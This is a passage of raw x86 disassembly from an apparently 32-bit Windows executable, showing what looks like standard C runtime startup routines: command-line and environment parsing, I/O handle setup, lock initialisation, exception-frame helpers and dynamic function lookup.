  424c9b:	inc    DWORD PTR [esi]
  424c9d:	mov    cl,BYTE PTR [eax]
  424c9f:	mov    BYTE PTR [edi],cl
  424ca1:	inc    edi
  424ca2:	jmp    0x424cb3
  424ca4:	movzx  ecx,cl
  424ca7:	test   BYTE PTR [ecx+0x4674e1],0x4
  424cae:	je     0x424cb3
  424cb0:	inc    eax
  424cb1:	inc    DWORD PTR [esi]
  424cb3:	inc    DWORD PTR [esi]
  424cb5:	inc    eax
  424cb6:	jmp    0x424c23
  424cbb:	test   edi,edi
  424cbd:	je     0x424cc3
  424cbf:	and    BYTE PTR [edi],0x0
  424cc2:	inc    edi
  424cc3:	inc    DWORD PTR [esi]
  424cc5:	mov    ebx,DWORD PTR [ebp+0xc]
  424cc8:	jmp    0x424bee
  424ccd:	mov    eax,DWORD PTR [ebp+0x8]
  424cd0:	test   eax,eax
  424cd2:	je     0x424cd7
  424cd4:	and    DWORD PTR [eax],0x0
  424cd7:	inc    DWORD PTR [ebx]
  424cd9:	pop    edi
  424cda:	pop    ebx
  424cdb:	leave  
  424cdc:	ret    
  424cdd:	push   ebp
  424cde:	mov    ebp,esp
  424ce0:	push   ecx
  424ce1:	push   ecx
  424ce2:	push   ebx
  424ce3:	push   esi
  424ce4:	push   edi
  424ce5:	xor    edi,edi
  424ce7:	cmp    DWORD PTR ds:0x46782c,edi
  424ced:	jne    0x424cf4
  424cef:	call   0x425e7c
  424cf4:	and    BYTE PTR ds:0x4671d4,0x0
  424cfb:	push   0x104
  424d00:	mov    esi,0x4670d0
  424d05:	push   esi
  424d06:	push   edi
  424d07:	call   DWORD PTR ds:0x429084
  424d0d:	mov    eax,ds:0x467834
  424d12:	cmp    eax,edi
  424d14:	mov    DWORD PTR ds:0x4670b4,esi
  424d1a:	je     0x424d23
  424d1c:	cmp    BYTE PTR [eax],0x0
  424d1f:	mov    ebx,eax
  424d21:	jne    0x424d25
  424d23:	mov    ebx,esi
  424d25:	lea    eax,[ebp-0x4]
  424d28:	push   eax
  424d29:	push   edi
  424d2a:	lea    esi,[ebp-0x8]
  424d2d:	xor    ecx,ecx
  424d2f:	mov    eax,ebx
  424d31:	call   0x424b71
  424d36:	mov    esi,DWORD PTR [ebp-0x4]
  424d39:	mov    eax,DWORD PTR [ebp-0x8]
  424d3c:	shl    esi,0x2
  424d3f:	add    eax,esi
  424d41:	push   eax
  424d42:	call   0x425fb2
  424d47:	mov    edi,eax
  424d49:	add    esp,0xc
  424d4c:	test   edi,edi
  424d4e:	jne    0x424d55
  424d50:	or     eax,0xffffffff
  424d53:	jmp    0x424d7a
  424d55:	lea    eax,[ebp-0x4]
  424d58:	push   eax
  424d59:	lea    ecx,[esi+edi*1]
  424d5c:	push   edi
  424d5d:	lea    esi,[ebp-0x8]
  424d60:	mov    eax,ebx
  424d62:	call   0x424b71
  424d67:	mov    eax,DWORD PTR [ebp-0x4]
  424d6a:	dec    eax
  424d6b:	pop    ecx
  424d6c:	mov    ds:0x467098,eax
  424d71:	pop    ecx
  424d72:	mov    DWORD PTR ds:0x46709c,edi
  424d78:	xor    eax,eax
  424d7a:	pop    edi
  424d7b:	pop    esi
  424d7c:	pop    ebx
  424d7d:	leave  
  424d7e:	ret    
  424d7f:	push   ecx
  424d80:	push   ecx
  424d81:	mov    eax,ds:0x4671d8
  424d86:	push   ebx
  424d87:	push   ebp
  424d88:	push   esi
  424d89:	push   edi
  424d8a:	mov    edi,DWORD PTR ds:0x42909c
  424d90:	xor    ebx,ebx
  424d92:	xor    esi,esi
  424d94:	cmp    eax,ebx
  424d96:	push   0x2
  424d98:	pop    ebp
  424d99:	jne    0x424dc8
  424d9b:	call   edi
  424d9d:	mov    esi,eax
  424d9f:	cmp    esi,ebx
  424da1:	je     0x424daf
  424da3:	mov    DWORD PTR ds:0x4671d8,0x1
  424dad:	jmp    0x424dcd
  424daf:	call   DWORD PTR ds:0x429034
  424db5:	cmp    eax,0x78
  424db8:	jne    0x424dc3
  424dba:	mov    eax,ebp
  424dbc:	mov    ds:0x4671d8,eax
  424dc1:	jmp    0x424dc8
  424dc3:	mov    eax,ds:0x4671d8
  424dc8:	cmp    eax,0x1
  424dcb:	jne    0x424e4a
  424dcd:	cmp    esi,ebx
  424dcf:	jne    0x424dd9
  424dd1:	call   edi
  424dd3:	mov    esi,eax
  424dd5:	cmp    esi,ebx
  424dd7:	je     0x424e52
  424dd9:	cmp    WORD PTR [esi],bx
  424ddc:	mov    eax,esi
  424dde:	je     0x424dee
  424de0:	add    eax,ebp
  424de2:	cmp    WORD PTR [eax],bx
  424de5:	jne    0x424de0
  424de7:	add    eax,ebp
  424de9:	cmp    WORD PTR [eax],bx
  424dec:	jne    0x424de0
  424dee:	mov    edi,DWORD PTR ds:0x429098
  424df4:	push   ebx
  424df5:	push   ebx
  424df6:	push   ebx
  424df7:	sub    eax,esi
  424df9:	push   ebx
  424dfa:	sar    eax,1
  424dfc:	inc    eax
  424dfd:	push   eax
  424dfe:	push   esi
  424dff:	push   ebx
  424e00:	push   ebx
  424e01:	mov    DWORD PTR [esp+0x34],eax
  424e05:	call   edi
  424e07:	mov    ebp,eax
  424e09:	cmp    ebp,ebx
  424e0b:	je     0x424e3f
  424e0d:	push   ebp
  424e0e:	call   0x425fb2
  424e13:	cmp    eax,ebx
  424e15:	pop    ecx
  424e16:	mov    DWORD PTR [esp+0x10],eax
  424e1a:	je     0x424e3f
  424e1c:	push   ebx
  424e1d:	push   ebx
  424e1e:	push   ebp
  424e1f:	push   eax
  424e20:	push   DWORD PTR [esp+0x24]
  424e24:	push   esi
  424e25:	push   ebx
  424e26:	push   ebx
  424e27:	call   edi
  424e29:	test   eax,eax
  424e2b:	jne    0x424e3b
  424e2d:	push   DWORD PTR [esp+0x10]
  424e31:	call   0x425e9a
  424e36:	pop    ecx
  424e37:	mov    DWORD PTR [esp+0x10],ebx
  424e3b:	mov    ebx,DWORD PTR [esp+0x10]
  424e3f:	push   esi
  424e40:	call   DWORD PTR ds:0x429094
  424e46:	mov    eax,ebx
  424e48:	jmp    0x424e9a
  424e4a:	cmp    eax,ebp
  424e4c:	je     0x424e56
  424e4e:	cmp    eax,ebx
  424e50:	je     0x424e56
  424e52:	xor    eax,eax
  424e54:	jmp    0x424e9a
  424e56:	call   DWORD PTR ds:0x429090
  424e5c:	mov    esi,eax
  424e5e:	cmp    esi,ebx
  424e60:	je     0x424e52
  424e62:	cmp    BYTE PTR [esi],bl
  424e64:	je     0x424e70
  424e66:	inc    eax
  424e67:	cmp    BYTE PTR [eax],bl
  424e69:	jne    0x424e66
  424e6b:	inc    eax
  424e6c:	cmp    BYTE PTR [eax],bl
  424e6e:	jne    0x424e66
  424e70:	sub    eax,esi
  424e72:	inc    eax
  424e73:	mov    ebp,eax
  424e75:	push   ebp
  424e76:	call   0x425fb2
  424e7b:	mov    edi,eax
  424e7d:	cmp    edi,ebx
  424e7f:	pop    ecx
  424e80:	jne    0x424e86
  424e82:	xor    edi,edi
  424e84:	jmp    0x424e91
  424e86:	push   ebp
  424e87:	push   esi
  424e88:	push   edi
  424e89:	call   0x425fd0
  424e8e:	add    esp,0xc
  424e91:	push   esi
  424e92:	call   DWORD PTR ds:0x42908c
  424e98:	mov    eax,edi
  424e9a:	pop    edi
  424e9b:	pop    esi
  424e9c:	pop    ebp
  424e9d:	pop    ebx
  424e9e:	pop    ecx
  424e9f:	pop    ecx
  424ea0:	ret    
  424ea1:	sub    esp,0x48
  424ea4:	push   ebx
  424ea5:	mov    ebx,0x480
  424eaa:	push   ebx
  424eab:	call   0x425fb2
  424eb0:	test   eax,eax
  424eb2:	pop    ecx
  424eb3:	jne    0x424ebd
  424eb5:	or     eax,0xffffffff
  424eb8:	jmp    0x42509a
  424ebd:	mov    ds:0x467720,eax
  424ec2:	mov    DWORD PTR ds:0x467708,0x20
  424ecc:	lea    ecx,[eax+0x480]
  424ed2:	jmp    0x424ef2
  424ed4:	and    BYTE PTR [eax+0x4],0x0
  424ed8:	or     DWORD PTR [eax],0xffffffff
  424edb:	and    DWORD PTR [eax+0x8],0x0
  424edf:	mov    BYTE PTR [eax+0x5],0xa
  424ee3:	mov    ecx,DWORD PTR ds:0x467720
  424ee9:	add    eax,0x24
  424eec:	add    ecx,0x480
  424ef2:	cmp    eax,ecx
  424ef4:	jb     0x424ed4
  424ef6:	push   ebp
  424ef7:	push   esi
  424ef8:	push   edi
  424ef9:	lea    eax,[esp+0x14]
  424efd:	push   eax
  424efe:	call   DWORD PTR ds:0x429064
  424f04:	cmp    WORD PTR [esp+0x46],0x0
  424f0a:	je     0x424ff9
  424f10:	mov    eax,DWORD PTR [esp+0x48]
  424f14:	test   eax,eax
  424f16:	je     0x424ff9
  424f1c:	mov    edi,DWORD PTR [eax]
  424f1e:	lea    ebp,[eax+0x4]
  424f21:	lea    eax,[edi+ebp*1]
  424f24:	mov    DWORD PTR [esp+0x10],eax
  424f28:	mov    eax,0x800
  424f2d:	cmp    edi,eax
  424f2f:	jl     0x424f33
  424f31:	mov    edi,eax
  424f33:	cmp    DWORD PTR ds:0x467708,edi
  424f39:	jge    0x424f89
  424f3b:	mov    esi,0x467724
  424f40:	push   ebx
  424f41:	call   0x425fb2
  424f46:	test   eax,eax
  424f48:	pop    ecx
  424f49:	je     0x424f83
  424f4b:	add    DWORD PTR ds:0x467708,0x20
  424f52:	mov    DWORD PTR [esi],eax
  424f54:	lea    ecx,[eax+0x480]
  424f5a:	jmp    0x424f72
  424f5c:	and    BYTE PTR [eax+0x4],0x0
  424f60:	or     DWORD PTR [eax],0xffffffff
  424f63:	and    DWORD PTR [eax+0x8],0x0
  424f67:	mov    BYTE PTR [eax+0x5],0xa
  424f6b:	mov    ecx,DWORD PTR [esi]
  424f6d:	add    eax,0x24
  424f70:	add    ecx,ebx
  424f72:	cmp    eax,ecx
  424f74:	jb     0x424f5c
  424f76:	add    esi,0x4
  424f79:	cmp    DWORD PTR ds:0x467708,edi
  424f7f:	jl     0x424f40
  424f81:	jmp    0x424f89
  424f83:	mov    edi,DWORD PTR ds:0x467708
  424f89:	xor    ebx,ebx
  424f8b:	test   edi,edi
  424f8d:	jle    0x424ff9
  424f8f:	mov    eax,DWORD PTR [esp+0x10]
  424f93:	mov    eax,DWORD PTR [eax]
  424f95:	cmp    eax,0xffffffff
  424f98:	je     0x424fee
  424f9a:	mov    cl,BYTE PTR [ebp+0x0]
  424f9d:	test   cl,0x1
  424fa0:	je     0x424fee
  424fa2:	test   cl,0x8
  424fa5:	jne    0x424fb2
  424fa7:	push   eax
  424fa8:	call   DWORD PTR ds:0x4290a4
  424fae:	test   eax,eax
  424fb0:	je     0x424fee
  424fb2:	mov    ecx,ebx
  424fb4:	mov    eax,ebx
  424fb6:	and    eax,0x1f
  424fb9:	lea    eax,[eax+eax*8]
  424fbc:	sar    ecx,0x5
  424fbf:	mov    ecx,DWORD PTR [ecx*4+0x467720]
  424fc6:	lea    esi,[ecx+eax*4]
  424fc9:	mov    eax,DWORD PTR [esp+0x10]
  424fcd:	mov    eax,DWORD PTR [eax]
  424fcf:	mov    DWORD PTR [esi],eax
  424fd1:	mov    al,BYTE PTR [ebp+0x0]
  424fd4:	mov    BYTE PTR [esi+0x4],al
  424fd7:	lea    eax,[esi+0xc]
  424fda:	push   0xfa0
  424fdf:	push   eax
  424fe0:	call   0x42631d
  424fe5:	test   eax,eax
  424fe7:	pop    ecx
  424fe8:	pop    ecx
  424fe9:	je     0x425019
  424feb:	inc    DWORD PTR [esi+0x8]
  424fee:	add    DWORD PTR [esp+0x10],0x4
  424ff3:	inc    ebx
  424ff4:	inc    ebp
  424ff5:	cmp    ebx,edi
  424ff7:	jl     0x424f8f
  424ff9:	xor    ebx,ebx
  424ffb:	mov    ecx,DWORD PTR ds:0x467720
  425001:	lea    eax,[ebx+ebx*8]
  425004:	lea    esi,[ecx+eax*4]
  425007:	cmp    DWORD PTR [esi],0xffffffff
  42500a:	jne    0x42507b
  42500c:	test   ebx,ebx
  42500e:	mov    BYTE PTR [esi+0x4],0x81
  425012:	jne    0x42501e
  425014:	push   0xfffffff6
  425016:	pop    eax
  425017:	jmp    0x425028
  425019:	or     eax,0xffffffff
  42501c:	jmp    0x425097
  42501e:	mov    eax,ebx
  425020:	dec    eax
  425021:	neg    eax
  425023:	sbb    eax,eax
  425025:	add    eax,0xfffffff5
  425028:	push   eax
  425029:	call   DWORD PTR ds:0x429080
  42502f:	mov    edi,eax
  425031:	cmp    edi,0xffffffff
  425034:	je     0x425075
  425036:	push   edi
  425037:	call   DWORD PTR ds:0x4290a4
  42503d:	test   eax,eax
  42503f:	je     0x425075
  425041:	and    eax,0xff
  425046:	cmp    eax,0x2
  425049:	mov    DWORD PTR [esi],edi
  42504b:	jne    0x425053
  42504d:	or     BYTE PTR [esi+0x4],0x40
  425051:	jmp    0x42505c
  425053:	cmp    eax,0x3
  425056:	jne    0x42505c
  425058:	or     BYTE PTR [esi+0x4],0x8
  42505c:	lea    eax,[esi+0xc]
  42505f:	push   0xfa0
  425064:	push   eax
  425065:	call   0x42631d
  42506a:	test   eax,eax
  42506c:	pop    ecx
  42506d:	pop    ecx
  42506e:	je     0x425019
  425070:	inc    DWORD PTR [esi+0x8]
  425073:	jmp    0x42507f
  425075:	or     BYTE PTR [esi+0x4],0x40
  425079:	jmp    0x42507f
  42507b:	or     BYTE PTR [esi+0x4],0x80
  42507f:	inc    ebx
  425080:	cmp    ebx,0x3
  425083:	jl     0x424ffb
  425089:	push   DWORD PTR ds:0x467708
  42508f:	call   DWORD PTR ds:0x4290a0
  425095:	xor    eax,eax
  425097:	pop    edi
  425098:	pop    esi
  425099:	pop    ebp
  42509a:	pop    ebx
  42509b:	add    esp,0x48
  42509e:	ret    
  42509f:	push   0xc
  4250a1:	push   0x429500
  4250a6:	call   0x425290
  4250ab:	mov    DWORD PTR [ebp-0x1c],0x429f58
  4250b2:	cmp    DWORD PTR [ebp-0x1c],0x429f58
  4250b9:	jae    0x4250dd
  4250bb:	and    DWORD PTR [ebp-0x4],0x0
  4250bf:	mov    eax,DWORD PTR [ebp-0x1c]
  4250c2:	mov    eax,DWORD PTR [eax]
  4250c4:	test   eax,eax
  4250c6:	je     0x4250d3
  4250c8:	call   eax
  4250ca:	jmp    0x4250d3
  4250cc:	xor    eax,eax
  4250ce:	inc    eax
  4250cf:	ret    
  4250d0:	mov    esp,DWORD PTR [ebp-0x18]
  4250d3:	or     DWORD PTR [ebp-0x4],0xffffffff
  4250d7:	add    DWORD PTR [ebp-0x1c],0x4
  4250db:	jmp    0x4250b2
  4250dd:	call   0x4252cb
  4250e2:	ret    
  4250e3:	push   0xc
  4250e5:	push   0x429510
  4250ea:	call   0x425290
  4250ef:	mov    DWORD PTR [ebp-0x1c],0x429f60
  4250f6:	cmp    DWORD PTR [ebp-0x1c],0x429f60
  4250fd:	jae    0x425121
  4250ff:	and    DWORD PTR [ebp-0x4],0x0
  425103:	mov    eax,DWORD PTR [ebp-0x1c]
  425106:	mov    eax,DWORD PTR [eax]
  425108:	test   eax,eax
  42510a:	je     0x425117
  42510c:	call   eax
  42510e:	jmp    0x425117
  425110:	xor    eax,eax
  425112:	inc    eax
  425113:	ret    
  425114:	mov    esp,DWORD PTR [ebp-0x18]
  425117:	or     DWORD PTR [ebp-0x4],0xffffffff
  42511b:	add    DWORD PTR [ebp-0x1c],0x4
  42511f:	jmp    0x4250f6
  425121:	call   0x4252cb
  425126:	ret    
  425127:	call   0x425366
  42512c:	mov    eax,ds:0x4668bc
  425131:	cmp    eax,0xffffffff
  425134:	je     0x425144
  425136:	push   eax
  425137:	call   DWORD PTR ds:0x4290ac
  42513d:	or     DWORD PTR ds:0x4668bc,0xffffffff
  425144:	ret    
  425145:	push   ebx
  425146:	push   esi
  425147:	call   DWORD PTR ds:0x429034
  42514d:	push   DWORD PTR ds:0x4668bc
  425153:	mov    ebx,eax
  425155:	call   DWORD PTR ds:0x4290bc
  42515b:	mov    esi,eax
  42515d:	test   esi,esi
  42515f:	jne    0x4251aa
  425161:	push   0x88
  425166:	push   0x1
  425168:	call   0x4263a8
  42516d:	mov    esi,eax
  42516f:	test   esi,esi
  425171:	pop    ecx
  425172:	pop    ecx
  425173:	je     0x4251a2
  425175:	push   esi
  425176:	push   DWORD PTR ds:0x4668bc
  42517c:	call   DWORD PTR ds:0x4290b8
  425182:	test   eax,eax
  425184:	je     0x4251a2
  425186:	mov    DWORD PTR [esi+0x54],0x466810
  42518d:	mov    DWORD PTR [esi+0x14],0x1
  425194:	call   DWORD PTR ds:0x4290b4
  42519a:	or     DWORD PTR [esi+0x4],0xffffffff
  42519e:	mov    DWORD PTR [esi],eax
  4251a0:	jmp    0x4251aa
  4251a2:	push   0x10
  4251a4:	call   0x424358
  4251a9:	pop    ecx
  4251aa:	push   ebx
  4251ab:	call   DWORD PTR ds:0x4290b0
  4251b1:	mov    eax,esi
  4251b3:	pop    esi
  4251b4:	pop    ebx
  4251b5:	ret    
  4251b6:	call   0x42531d
  4251bb:	test   eax,eax
  4251bd:	je     0x4251cf
  4251bf:	call   DWORD PTR ds:0x4290c0
  4251c5:	cmp    eax,0xffffffff
  4251c8:	mov    ds:0x4668bc,eax
  4251cd:	jne    0x4251d7
  4251cf:	call   0x425127
  4251d4:	xor    eax,eax
  4251d6:	ret    
  4251d7:	push   esi
  4251d8:	push   0x88
  4251dd:	push   0x1
  4251df:	call   0x4263a8
  4251e4:	mov    esi,eax
  4251e6:	test   esi,esi
  4251e8:	pop    ecx
  4251e9:	pop    ecx
  4251ea:	je     0x42521c
  4251ec:	push   esi
  4251ed:	push   DWORD PTR ds:0x4668bc
  4251f3:	call   DWORD PTR ds:0x4290b8
  4251f9:	test   eax,eax
  4251fb:	je     0x42521c
  4251fd:	mov    DWORD PTR [esi+0x54],0x466810
  425204:	mov    DWORD PTR [esi+0x14],0x1
  42520b:	call   DWORD PTR ds:0x4290b4
  425211:	or     DWORD PTR [esi+0x4],0xffffffff
  425215:	mov    DWORD PTR [esi],eax
  425217:	xor    eax,eax
  425219:	inc    eax
  42521a:	pop    esi
  42521b:	ret    
  42521c:	call   0x425127
  425221:	xor    eax,eax
  425223:	pop    esi
  425224:	ret    
  425225:	cmp    DWORD PTR ds:0x467084,0x2
  42522c:	jne    0x42523b
  42522e:	cmp    DWORD PTR ds:0x467090,0x5
  425235:	jb     0x42523b
  425237:	xor    eax,eax
  425239:	inc    eax
  42523a:	ret    
  42523b:	push   0x3
  42523d:	pop    eax
  42523e:	ret    
  42523f:	xor    eax,eax
  425241:	cmp    DWORD PTR [esp+0x4],eax
  425245:	push   0x0
  425247:	sete   al
  42524a:	push   0x1000
  42524f:	push   eax
  425250:	call   DWORD PTR ds:0x429038
  425256:	test   eax,eax
  425258:	mov    ds:0x467700,eax
  42525d:	je     0x425289
  42525f:	call   0x425225
  425264:	cmp    eax,0x3
  425267:	mov    ds:0x467704,eax
  42526c:	jne    0x42528c
  42526e:	push   0x3f8
  425273:	call   0x42662a
  425278:	test   eax,eax
  42527a:	pop    ecx
  42527b:	jne    0x42528c
  42527d:	push   DWORD PTR ds:0x467700
  425283:	call   DWORD PTR ds:0x429020
  425289:	xor    eax,eax
  42528b:	ret    
  42528c:	xor    eax,eax
  42528e:	inc    eax
  42528f:	ret    
  425290:	push   0x427158
  425295:	mov    eax,fs:0x0
  42529b:	push   eax
  42529c:	mov    eax,DWORD PTR [esp+0x10]
  4252a0:	mov    DWORD PTR [esp+0x10],ebp
  4252a4:	lea    ebp,[esp+0x10]
  4252a8:	sub    esp,eax
  4252aa:	push   ebx
  4252ab:	push   esi
  4252ac:	push   edi
  4252ad:	mov    eax,DWORD PTR [ebp-0x8]
  4252b0:	mov    DWORD PTR [ebp-0x18],esp
  4252b3:	push   eax
  4252b4:	mov    eax,DWORD PTR [ebp-0x4]
  4252b7:	mov    DWORD PTR [ebp-0x4],0xffffffff
  4252be:	mov    DWORD PTR [ebp-0x8],eax
  4252c1:	lea    eax,[ebp-0x10]
  4252c4:	mov    fs:0x0,eax
  4252ca:	ret    
  4252cb:	mov    ecx,DWORD PTR [ebp-0x10]
  4252ce:	mov    DWORD PTR fs:0x0,ecx
  4252d5:	pop    ecx
  4252d6:	pop    edi
  4252d7:	pop    esi
  4252d8:	pop    ebx
  4252d9:	leave  
  4252da:	push   ecx
  4252db:	ret    
  4252dc:	int3   
  4252dd:	int3   
  4252de:	int3   
  4252df:	int3   
  4252e0:	cmp    eax,0x1000
  4252e5:	jae    0x4252f5
  4252e7:	neg    eax
  4252e9:	add    eax,esp
  4252eb:	add    eax,0x4
  4252ee:	test   DWORD PTR [eax],eax
  4252f0:	xchg   esp,eax
  4252f1:	mov    eax,DWORD PTR [eax]
  4252f3:	push   eax
  4252f4:	ret    
  4252f5:	push   ecx
  4252f6:	lea    ecx,[esp+0x8]
  4252fa:	sub    ecx,0x1000
  425300:	sub    eax,0x1000
  425305:	test   DWORD PTR [ecx],eax
  425307:	cmp    eax,0x1000
  42530c:	jae    0x4252fa
  42530e:	sub    ecx,eax
  425310:	mov    eax,esp
  425312:	test   DWORD PTR [ecx],eax
  425314:	mov    esp,ecx
  425316:	mov    ecx,DWORD PTR [eax]
  425318:	mov    eax,DWORD PTR [eax+0x4]
  42531b:	push   eax
  42531c:	ret    
  42531d:	push   esi
  42531e:	push   edi
  42531f:	xor    esi,esi
  425321:	mov    edi,0x4671e0
  425326:	cmp    DWORD PTR [esi*8+0x4668d4],0x1
  42532e:	jne    0x42534e
  425330:	lea    eax,[esi*8+0x4668d0]
  425337:	mov    DWORD PTR [eax],edi
  425339:	push   0xfa0
  42533e:	push   DWORD PTR [eax]
  425340:	add    edi,0x18
  425343:	call   0x42631d
  425348:	test   eax,eax
  42534a:	pop    ecx
  42534b:	pop    ecx
  42534c:	je     0x42535a
  42534e:	inc    esi
  42534f:	cmp    esi,0x24
  425352:	jl     0x425326
  425354:	xor    eax,eax
  425356:	inc    eax
  425357:	pop    edi
  425358:	pop    esi
  425359:	ret    
  42535a:	and    DWORD PTR [esi*8+0x4668d0],0x0
  425362:	xor    eax,eax
  425364:	jmp    0x425357
  425366:	push   ebx
  425367:	mov    ebx,DWORD PTR ds:0x4290a8
  42536d:	push   esi
  42536e:	mov    esi,0x4668d0
  425373:	push   edi
  425374:	mov    edi,DWORD PTR [esi]
  425376:	test   edi,edi
  425378:	je     0x42538d
  42537a:	cmp    DWORD PTR [esi+0x4],0x1
  42537e:	je     0x42538d
  425380:	push   edi
  425381:	call   ebx
  425383:	push   edi
  425384:	call   0x425e9a
  425389:	and    DWORD PTR [esi],0x0
  42538c:	pop    ecx
  42538d:	add    esi,0x8
  425390:	cmp    esi,0x4669f0
  425396:	jl     0x425374
  425398:	mov    esi,0x4668d0
  42539d:	pop    edi
  42539e:	mov    eax,DWORD PTR [esi]
  4253a0:	test   eax,eax
  4253a2:	je     0x4253ad
  4253a4:	cmp    DWORD PTR [esi+0x4],0x1
  4253a8:	jne    0x4253ad
  4253aa:	push   eax
  4253ab:	call   ebx
  4253ad:	add    esi,0x8
  4253b0:	cmp    esi,0x4669f0
  4253b6:	jl     0x42539e
  4253b8:	pop    esi
  4253b9:	pop    ebx
  4253ba:	ret    
  4253bb:	push   ebp
  4253bc:	mov    ebp,esp
  4253be:	mov    eax,DWORD PTR [ebp+0x8]
  4253c1:	push   DWORD PTR [eax*8+0x4668d0]
  4253c8:	call   DWORD PTR ds:0x4290c4
  4253ce:	pop    ebp
  4253cf:	ret    
  4253d0:	push   ebp
  4253d1:	mov    ebp,esp
  4253d3:	push   esi
  4253d4:	mov    esi,DWORD PTR [ebp+0x8]
  4253d7:	lea    esi,[esi*8+0x4668d0]
  4253de:	cmp    DWORD PTR [esi],0x0
  4253e1:	je     0x4253e8
  4253e3:	xor    eax,eax
  4253e5:	inc    eax
  4253e6:	jmp    0x42544c
  4253e8:	push   edi
  4253e9:	push   0x18
  4253eb:	call   0x425fb2
  4253f0:	mov    edi,eax
  4253f2:	test   edi,edi
  4253f4:	pop    ecx
  4253f5:	jne    0x425406
  4253f7:	call   0x427230
  4253fc:	mov    DWORD PTR [eax],0xc
  425402:	xor    eax,eax
  425404:	jmp    0x42544b
  425406:	push   0xa
  425408:	call   0x42544f
  42540d:	cmp    DWORD PTR [esi],0x0
  425410:	pop    ecx
  425411:	jne    0x425439
  425413:	push   0xfa0
  425418:	push   edi
  425419:	call   0x42631d
  42541e:	test   eax,eax
  425420:	pop    ecx
  425421:	pop    ecx
  425422:	jne    0x425435
  425424:	push   edi
  425425:	call   0x425e9a
  42542a:	push   0xa
  42542c:	call   0x4253bb
  425431:	pop    ecx
  425432:	pop    ecx
  425433:	jmp    0x4253f7
  425435:	mov    DWORD PTR [esi],edi
  425437:	jmp    0x425440
  425439:	push   edi
  42543a:	call   0x425e9a
  42543f:	pop    ecx
  425440:	push   0xa
  425442:	call   0x4253bb
  425447:	xor    eax,eax
  425449:	pop    ecx
  42544a:	inc    eax
  42544b:	pop    edi
  42544c:	pop    esi
  42544d:	pop    ebp
  42544e:	ret    
  42544f:	push   ebp
  425450:	mov    ebp,esp
  425452:	mov    eax,DWORD PTR [ebp+0x8]
  425455:	push   esi
  425456:	lea    esi,[eax*8+0x4668d0]
  42545d:	cmp    DWORD PTR [esi],0x0
  425460:	jne    0x425475
  425462:	push   eax
  425463:	call   0x4253d0
  425468:	test   eax,eax
  42546a:	pop    ecx
  42546b:	jne    0x425475
  42546d:	push   0x11
  42546f:	call   0x424358
  425474:	pop    ecx
  425475:	push   DWORD PTR [esi]
  425477:	call   DWORD PTR ds:0x4290c8
  42547d:	pop    esi
  42547e:	pop    ebp
  42547f:	ret    
  425480:	push   esi
  425481:	push   DWORD PTR ds:0x467828
  425487:	call   0x4273e6
  42548c:	pop    ecx
  42548d:	mov    ecx,DWORD PTR ds:0x467824
  425493:	mov    esi,eax
  425495:	mov    eax,ds:0x467828
  42549a:	mov    edx,ecx
  42549c:	sub    edx,eax
  42549e:	add    edx,0x4
  4254a1:	cmp    esi,edx
  4254a3:	jae    0x4254f3
  4254a5:	mov    ecx,0x800
  4254aa:	cmp    esi,ecx
  4254ac:	jae    0x4254b0
  4254ae:	mov    ecx,esi
  4254b0:	add    ecx,esi
  4254b2:	push   ecx
  4254b3:	push   eax
  4254b4:	call   0x427239
  4254b9:	test   eax,eax
  4254bb:	pop    ecx
  4254bc:	pop    ecx
  4254bd:	jne    0x4254d6
  4254bf:	add    esi,0x10
  4254c2:	push   esi
  4254c3:	push   DWORD PTR ds:0x467828
  4254c9:	call   0x427239
  4254ce:	test   eax,eax
  4254d0:	pop    ecx
  4254d1:	pop    ecx
  4254d2:	jne    0x4254d6
  4254d4:	pop    esi
  4254d5:	ret    
  4254d6:	mov    ecx,DWORD PTR ds:0x467824
  4254dc:	sub    ecx,DWORD PTR ds:0x467828
  4254e2:	mov    ds:0x467828,eax
  4254e7:	sar    ecx,0x2
  4254ea:	lea    ecx,[eax+ecx*4]
  4254ed:	mov    DWORD PTR ds:0x467824,ecx
  4254f3:	mov    DWORD PTR [ecx],edi
  4254f5:	add    DWORD PTR ds:0x467824,0x4
  4254fc:	mov    eax,edi
  4254fe:	pop    esi
  4254ff:	ret    
  425500:	push   0x80
  425505:	call   0x425fb2
  42550a:	test   eax,eax
  42550c:	pop    ecx
  42550d:	mov    ds:0x467828,eax
  425512:	jne    0x425518
  425514:	push   0x18
  425516:	pop    eax
  425517:	ret    
  425518:	and    DWORD PTR [eax],0x0
  42551b:	mov    eax,ds:0x467828
  425520:	mov    ds:0x467824,eax
  425525:	xor    eax,eax
  425527:	ret    
  425528:	push   0xc
  42552a:	push   0x429520
  42552f:	call   0x425290
  425534:	call   0x4245a3
  425539:	and    DWORD PTR [ebp-0x4],0x0
  42553d:	mov    edi,DWORD PTR [ebp+0x8]
  425540:	call   0x425480
  425545:	mov    DWORD PTR [ebp-0x1c],eax
  425548:	or     DWORD PTR [ebp-0x4],0xffffffff
  42554c:	call   0x42555a
  425551:	mov    eax,DWORD PTR [ebp-0x1c]
  425554:	call   0x4252cb
  425559:	ret    
  42555a:	call   0x4245ac
  42555f:	ret    
  425560:	push   DWORD PTR [esp+0x4]
  425564:	call   0x425528
  425569:	neg    eax
  42556b:	sbb    eax,eax
  42556d:	neg    eax
  42556f:	pop    ecx
  425570:	dec    eax
  425571:	ret    
  425572:	push   ebp
  425573:	mov    ebp,esp
  425575:	sub    esp,0x10
  425578:	push   ebx
  425579:	xor    ebx,ebx
  42557b:	cmp    DWORD PTR ds:0x467330,ebx
  425581:	push   esi
  425582:	push   edi
  425583:	jne    0x4255f2
  425585:	push   0x429590
  42558a:	call   DWORD PTR ds:0x4290cc
  425590:	mov    edi,eax
  425592:	cmp    edi,ebx
  425594:	je     0x42562d
  42559a:	mov    esi,DWORD PTR ds:0x429048
  4255a0:	push   0x429584
  4255a5:	push   edi
  4255a6:	call   esi
  4255a8:	test   eax,eax
  4255aa:	mov    ds:0x467330,eax
  4255af:	je     0x42562d
  4255b1:	push   0x429574
  4255b6:	push   edi
  4255b7:	call   esi
  4255b9:	push   0x429560
  4255be:	push   edi
  4255bf:	mov    ds:0x467334,eax
  4255c4:	call   esi
  4255c6:	cmp    DWORD PTR ds:0x467084,0x2
  4255cd:	mov    ds:0x467338,eax
  4255d2:	jne    0x4255f2
  4255d4:	push   0x429544
  4255d9:	push   edi
  4255da:	call   esi
  4255dc:	test   eax,eax
  4255de:	mov    ds:0x467340,eax
  4255e3:	je     0x4255f2
  4255e5:	push   0x42952c
  4255ea:	push   edi
  4255eb:	call   esi
  4255ed:	mov    ds:0x46733c,eax
  4255f2:	mov    eax,ds:0x46733c
  4255f7:	test   eax,eax
  4255f9:	je     0x425637
  4255fb:	call   eax
